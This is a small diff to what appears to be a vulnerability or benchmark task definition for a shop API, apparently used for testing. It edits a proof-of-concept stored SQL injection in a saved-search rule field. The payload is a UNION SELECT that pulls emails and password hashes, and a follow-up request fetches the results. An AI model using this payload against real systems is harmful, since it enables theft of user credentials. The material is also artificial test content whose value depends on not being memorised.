@@ -31,7 +31,7 @@ oracle:
 
     '
   poc: POST /api/account/saved-searches {"label":"deals","rule":"tag:x' UNION SELECT id,email,password_hash,1,1
-    FROM users--"} then GET /api/account/saved-searches/{id}/results
+    FROM customers--"} then GET /api/account/saved-searches/{id}/results
   signal: shop.search.saved.plan_anomaly
 tags:
 - rest
